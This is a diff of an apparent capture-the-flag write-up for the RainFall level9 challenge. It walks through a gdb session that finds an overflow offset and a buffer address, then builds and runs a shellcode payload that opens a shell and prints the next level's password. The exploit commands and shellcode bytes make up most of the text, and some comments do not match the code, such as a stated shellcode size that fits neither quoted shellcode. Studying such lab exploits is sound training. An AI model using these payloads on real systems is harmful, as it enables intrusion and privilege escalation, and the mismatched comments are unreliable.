@@ -103,14 +103,48 @@ Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1A
 Program received signal SIGSEGV, Segmentation fault.
 0x08048682 in main ()
 
-# A segfault, nice, we've write on the memory, let's check what eax saved from the return function memcpy
+# A segfault, nice, we've write on the memory, let's check what register saved from the return function memcpy
 # eax is used to save the return value of a function, let's check what it have saved
 
-(gdb) info register eax
+(gdb) info registers
 eax            0x41366441	1094083649
+ecx            0x67413567	1732326759
+edx            0x804a0d4	134521044
+ebx            0x804a078	134520952
+esp            0xbffff640	0xbffff640
+ebp            0xbffff668	0xbffff668
+...
 
-# 0x41366441 is what it have saved, let's check the offset: 108, cool, now we know how many bytes we have to send to write on eax
+# 0x41366441 is what it have saved, let's check the offset with the website https://wiremask.eu/tools/buffer-overflow-pattern-generator/: 108, cool, now we know how many bytes we have to send to write on eax
 # We can't call other function because nothing else can be exploited, we have to use a shellcode here
-# Let's find one which execute sh https://shell-storm.org/shellcode/files/shellcode-827.html
-# \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
-# It's size is 23 bytes
+# Let's find one which execute sh https://shell-storm.org/shellcode/files/shellcode-491.html
+# \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
+# It's size is 48 bytes, keep it for after
+#
+# The next step what we have to do is to find the address of the begining of our buffer to execute our shellcode
+# Let's find it with gdb by setting up a breakpoint when the program writes on eax
+
+   0x0804867c <+136>:	mov    0x10(%esp),%eax
+
+(gdb) b *0x0804867c
+Breakpoint 1 at 0x804867c
+(gdb) r AAAA
+Starting program: /home/user/level9/level9 AAAA
+
+Breakpoint 1, 0x0804867c in main ()
+(gdb) x $eax
+0x804a00c:	0x41414141
+
+# 0x804a00c is the address of the begining of our buffer
+# The goal of this exploit is to execute function thanks to the value written in eax and thanks to our shellcode
+# So, the address of our payload will be:
+| address of our buffer | shellcode | padding to write on edx | address of our buffer |
+|       4 bytes         |  48 bytes | 108 - 4 - 48 = 56 bytes |         4 bytes       |
+
+./level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81" + "A" * 56 + "\x0c\xa0\04\x08"')
+
+level9@RainFall:~$ ./level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81" + "A" * 56 + "\x0c\xa0\04\x08"')
+$ whoami
+bonus0
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
